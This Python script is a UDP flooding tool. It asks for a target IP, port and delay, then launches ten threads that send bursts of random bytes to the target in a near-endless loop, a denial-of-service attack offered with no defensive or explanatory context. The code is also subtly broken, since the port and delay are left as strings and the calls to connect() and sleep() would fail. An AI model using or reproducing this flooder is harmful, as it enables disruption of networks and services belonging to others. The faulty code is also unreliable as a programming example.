import socket, time, os
import threading

class AttackThread(threading.Thread):
    def __init__(self, addr, port, sleep, server):
        threading.Thread.__init__(self)
        self.addr = addr
        self.port = port
        self.sleep = sleep
        self.server = server

    def run(self):
        self.server.connect((self.addr, self.port))
        for i in range(1, 10**1000):
            self.server.send(os.urandom(10)*1000)
            print(f"Send: {i}", end= "\r")
            time.sleep(self.sleep)

def main():
    addr = input("Insert the ip: ")
    port = input("Insert the port: ")
    sleep = input("Insert the time to sleep: ")
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    threads = []
    for i in range(10):
        thread = AttackThread(addr, port, sleep, server)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()